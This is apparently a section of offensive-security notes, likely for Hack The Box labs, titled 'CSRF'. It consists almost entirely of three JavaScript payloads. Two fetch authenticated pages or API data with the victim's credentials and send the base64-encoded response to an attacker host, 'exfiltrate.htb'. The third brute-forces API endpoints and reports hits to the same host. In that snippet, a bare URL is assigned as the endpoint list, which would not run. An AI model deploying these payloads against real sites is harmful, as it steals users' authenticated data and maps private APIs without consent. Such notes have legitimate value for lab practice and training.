## CSRF

### General Exfil Sending To Attacker Server

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "/home.php", false);
  xhr.withCredentials = true;
  xhr.send();
  var exfil = new XMLHttpRequest();
  exfil.open(
    "GET",
    "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText),
    false
  );
  exfil.send();
</script>
```

### Only Exfil

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://api.vulnerablesite.htb/data", true);
  xhr.withCredentials = true;
  xhr.onload = () => {
    location = "http://exfiltrate.htb/log?data=" + btoa(xhr.response);
  };
  xhr.send();
</script>
```

### Exfil API

```html
<script>
  var endpoints = https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt;

  for (i in endpoints){
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
      xhr.send();

      if (xhr.status != 404){
        var exfil = new XMLHttpRequest();
        exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(endpoints[i]), false);
        exfil.send();
      }
    } catch {
      // do nothing
    }
  }
</script>
```
